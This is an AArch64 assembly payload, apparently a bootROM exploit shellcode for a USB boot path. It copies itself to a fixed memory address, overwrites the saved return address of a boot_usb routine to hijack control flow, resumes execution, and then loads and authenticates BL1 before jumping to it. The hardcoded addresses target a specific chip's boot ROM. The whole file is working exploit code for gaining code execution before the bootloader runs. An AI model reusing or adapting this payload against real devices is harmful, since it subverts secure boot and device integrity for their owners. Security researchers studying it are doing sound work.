.text
.global _start

_start:
	b _stage1
	b _stage2

_stage1:
// self-copy
	ldr w0, _dst_ptr
	ldr w1, _bl1_ptr
	mov w2, 0x200 // size
	mov w4, w0
_copy:
	ldr x3, [x1], #8
	str x3, [x0], #8
	subs x2, x2, #8
	bne _copy
	add x4, x4, #0x30
	br x4

// restore x20 & x22
	ldr w20, _evtbuf_ptr
	mov x22, x20

// restore x21
	mov w21, #0x0

// hijack future control flow
	ldr w0, _boot_usb_ra
	ldr w1, _dst_ptr
	add w1, w1, #0x4 // _stage2
	str w1, [x0]

// resume original execution
	ldr w0, _original_ra
	br x0


_stage2:
// call boot_usb again to load BL1
	ldr w1, _boot_usb
	blr x1

// authenticate BL1 (required to boot unmodified bootloaders)
	mov w0, #0x1
	mov w1, #0x1
	ldr w2, _auth_bl1
	blr x2

// invalidate all instruction caches
	ic iallu

// jump to BL1
	ldr w0, _jmp_bl1
	br x0


_evtbuf_ptr: .dword 0x02021578
_boot_usb_ra: .dword 0x02020f60
_bl1_ptr: .dword 0x02021800
_original_ra: .dword 0x00007c68
_boot_usb: .dword 0x000064e0
_dst_ptr: .dword 0x020c0000
_auth_bl1: .dword 0x00012848
_jmp_bl1: .dword 0x000002c0